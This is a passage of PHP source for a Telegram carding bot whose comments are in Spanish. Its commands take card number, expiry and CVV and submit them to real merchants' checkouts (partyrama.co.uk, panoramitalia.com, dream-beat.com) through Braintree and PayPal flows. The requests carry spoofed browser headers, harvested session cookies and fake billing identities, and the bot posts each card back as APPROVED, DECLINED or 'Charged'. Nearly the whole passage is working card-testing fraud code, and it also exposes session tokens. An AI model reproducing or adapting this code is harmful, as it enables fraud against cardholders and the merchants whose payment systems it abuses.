ee_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fh9rc962wyvrr97jn%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fh9rc962wyvrr97jn%22%7D%2C%22merchantId%22%3A%22h9rc962wyvrr97jn%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22GBP%22%2C%22merchantIdentifier%22%3A%22h9rc962wyvrr97jn%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22".$cardinalAuthenticationJWT."%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22".$googleAuthorization."%22%2C%22paypalClientId%22%3A%22".$paypalClientId."%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Partyrama%22%2C%22clientId%22%3A%22".$clientId."%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22".$braintreeClientId."%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22appartyramacouk%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=&braintree_applepay_nonce_key=&braintree_applepay_device_data=&woocommerce-process-checkout-nonce=36f3fa9339&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';
$data = str_replace("36f3fa9339", $nonce1, $cadena);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.partyrama.co.uk?wc-ajax=checkout',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $data,
  CURLOPT_COOKIE => 'email-section=1; email-only='.$correo.'; email-section=1; delivery-instructions=; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=219e1f52d6422e534d2371ea41241d60; woocommerce_items_in_cart=1; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_9ba71db98f8a23b83246b9a81f591d%7C%7C1726117014%7C%7C1726113414%7C%7C2b17f0d48a34b8bebab8126cfa97159f; __kla_id=eyJlbWFpbCI6InJpZ29qNzc3QGdtYWlsLmNvbSJ9; woocommerce_cart_hash=4958933f2dac9049a052d2576efb347b; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
//    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.partyrama.co.uk',
    'referer: https://www.partyrama.co.uk/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$mensaje_error = trim(strip_tags($data['messages']));
//--------------------------------------------------
$patron = "/Reason: (.*)/";
preg_match($patron, $mensaje_error, $matches);
$respo = $matches[1];
//--------------------------------------------------
curl_close($curl);

if (empty($respo)) {
$respo = trim(strip_tags($data['messages']));

}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}
//echo "$respo\n";

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your payment method was rejected due to 3D Secure.') !== false || strpos($respo, 'Declined - Call Issuer') !== false || strpos($respo, 'Pick up card - S') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1.80)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}





////https://panoramitalia.com/index.php/subscribe/
elseif((strpos($message, "!pa") === 0)||(strpos($message, "/pa") === 0)||(strpos($message, ".pa") === 0)){

$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];                                            
$bin = substr($lista, 0, 6);

$verify = substr($cc, 16, 1);
if($verify != ""){
        $respuesta = "🚫 Oops!\nUse this format: /pa CC|MM|YYYY|CVV\n";
        sendMessage($chat_id,$respuesta, $message_id);
        die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){

}else{
        $respuesta = "🚫 Oops!\nUse this format: /pa CC|MM|YYYY|CVV\n";
        sendMessage($chat_id,$respuesta, $message_id);
        die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
//VARIABLES//
$MV = ucwords(strtolower(trim($brand)));
$cc = chunk_split($cc, 4, ' ');
$fecha = date('Y/m/d');



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://panoramitalia.com/index.php/subscribe/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Upgrade-Insecure-Requests: 1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.5',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
    'Referer: https://panoramitalia.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/name="_cf_verify" value="([^"]+)"/';
preg_match($patron, $response, $coincidencias);
$token = $coincidencias[1];
curl_close($curl);



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    '_cf_verify' => ''.$token.'',
    '_wp_http_referer' => '/index.php/subscribe/',
    '_cf_frm_id' => 'CF6317ae143565f',
    '_cf_frm_ct' => '1',
    'cfajax' => 'CF6317ae143565f',
    '_cf_cr_pst' => '335',
    'email' => '',
    'fld_1604923' => 'Canada',
    'fld_3782878' => '1 year ($20) - 4 issues',
    'fld_6223773' => 'First time subscription',
    'fld_3249557' => '1',
    'fld_7659764' => ''.$correo.'',
    'fld_5990741' => ''.$cc.'',
    'fld_1615852' => ''.$mes.' / '.$ano.'',
    'fld_4133199' => ''.$cvv.'',
    'fld_2356280' => ''.$MV.'',
    'fld_950613' => ''.$nombre.'',
    'fld_2278346' => ''.$apellido.'',
    'fld_6787259' => ''.$telefono.'',
    'fld_2041995' => 'United States',
    'fld_5232305' => '6195 bollinger rd',
    'fld_4491871' => '',
    'fld_3911000' => 'New york',
    'fld_2494407' => '10010',
    'fld_778305' => 'AZ',
    'fld_4577367' => '20.00',
    'fld_3144093' => 'click',
    'fld_5757786' => ''.$fecha.'',
    'fld_2545505' => '101205650',
    'fld_6974264' => '100',
    'alt_s' => '',
    'gxlkmf1070' => '236533',
    'instance' => '1',
    'request' => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
    'formId' => 'CF6317ae143565f',
    'postDisable' => '0',
    'target' => '#caldera_notices_1',
    'loadClass' => 'cf_processing',
    'loadElement' => '_parent',
    'hiderows' => 'true',
    'action' => 'cf_process_ajax_submit',
    'cfajax' => 'CF6317ae143565f',
    'template' => '#cfajax_CF6317ae143565f-tmpl',
  ],
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'X-Requested-With: XMLHttpRequest',
    'Accept-Language: es-US,es;q=0.5',
    'Origin: https://panoramitalia.com',
    'Referer: https://panoramitalia.com/index.php/subscribe/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$respo = strip_tags($data['html']);
curl_close($curl);

////EXTRAE EL MENSAJE DE SUSCRPCION////
$partes = explode('.', $respo);
$respo = implode('.', array_slice($partes, 0, 2));
if (!preg_match('/\.$/', $respo)) {
    $respo .= '.';
    $partes = explode(".", $respo);
    $gracias = trim(ucwords($partes[1]));
    $respo = "$gracias 20$";
	
}

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if ($respo == 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'){
$respo = 'Card Issuer Declined CVV';
}

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Transaction refused due to risk model.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 20$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}




elseif((strpos($message, "!pp") === 0)||(strpos($message, "/pp") === 0)||(strpos($message, ".pp") === 0)){

$lista = substr($message, 4);
//$i     = explode("|", $lista);

$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$ano1  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
//$ma = "$mes+%2F+$ano";

////
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /pp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !pp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .pp cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin
//SACA EL NONCE1//////////NONCE//////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://dream-beat.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=899f6f18-ce27-4e83-b4a9-cfb2876ed564823b3c; wordpress_logged_in_16be603727c326eebbb2512f82748386=bivix38912%7C1731620209%7CS17huKXg8ffumjbUd9XF6Af5TkY9hcO40E8uBzV8K1P%7Ca9b70d6cefb040188b7fd77817ab08a241cf24d5c174d2a05fa553cc25692acb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-04%2018%3A48%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-04%2018%3A48%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; woodmart_recently_viewed_products=15622; woocommerce_items_in_cart=1; wp_woocommerce_session_16be603727c326eebbb2512f82748386=78%7C%7C1730919051%7C%7C1730915451%7C%7Cd918bdddcd185a1b94b6d28930184bff; woocommerce_cart_hash=c4886a179fb1b6412f86234f994d7bdc; woodmart_wishlist_count=0; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fwishlist%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://dream-beat.com/wishlist/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

// Expresión regular para encontrar el nonce de create_order
$patron = '/"create_order":\{"endpoint":.*?"nonce":"([a-f0-9]+)"/';
// Buscar coincidencia
preg_match($patron, $response, $coincidencia);
// Extraer valor
$nonce = $coincidencia[1];
curl_close($curl);


//////TOKEN/////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://dream-beat.com?wc-ajax=ppc-create-order',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"nonce":"'.$nonce.'","payer":{"email_address":"bivix38912@rinseart.com","name":{"surname":"Perez","given_name":"Carlos"},"address":{"country_code":"US","address_line_1":"6195 bollinger rd","address_line_2":"","admin_area_1":"AZ","admin_area_2":"New york","postal_code":"10010"},"phone":{"phone_type":"HOME","phone_number":{"national_number":"4179204022"}}},"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-card-button-gateway","funding_source":"card","form_encoded":"wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fdream-beat.com%2Fwishlist%2F&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fdream-beat.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-11-04+21%3A01%3A02&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&billing_email=bivix38912%40rinseart.com&ship_to_different_address=1&shipping_first_name=Carlos&shipping_last_name=Perez&shipping_company=&shipping_country=US&shipping_address_1=6195+bollinger+rd&shipping_address_2=&shipping_city=New+york&shipping_state=AZ&shipping_postcode=10010&shipping_phone=4179204022&order_comments=&shipping_method%5B0%5D=flat_rate%3A4&payment_method=ppcp-card-button-gateway&woocommerce-process-checkout-nonce=a06e2df2eb&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}',
  CURLOPT_COOKIE => '__stripe_mid=899f6f18-ce27-4e83-b4a9-cfb2876ed564823b3c; wordpress_logged_in_16be603727c326eebbb2512f82748386=bivix38912%7C1731620209%7CS17huKXg8ffumjbUd9XF6Af5TkY9hcO40E8uBzV8K1P%7Ca9b70d6cefb040188b7fd77817ab08a241cf24d5c174d2a05fa553cc25692acb; wp_woocommerce_session_16be603727c326eebbb2512f82748386=78%7C%7C1730919051%7C%7C1730915451%7C%7Cd918bdddcd185a1b94b6d28930184bff; woodmart_wishlist_count=0; woocommerce_items_in_cart=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-04%2021%3A01%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fwishlist%2F; sbjs_first_add=fd%3D2024-11-04%2021%3A01%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fwishlist%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_cart_hash=c4886a179fb1b6412f86234f994d7bdc; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'referer: https://dream-beat.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$token = $json['data']['id'];
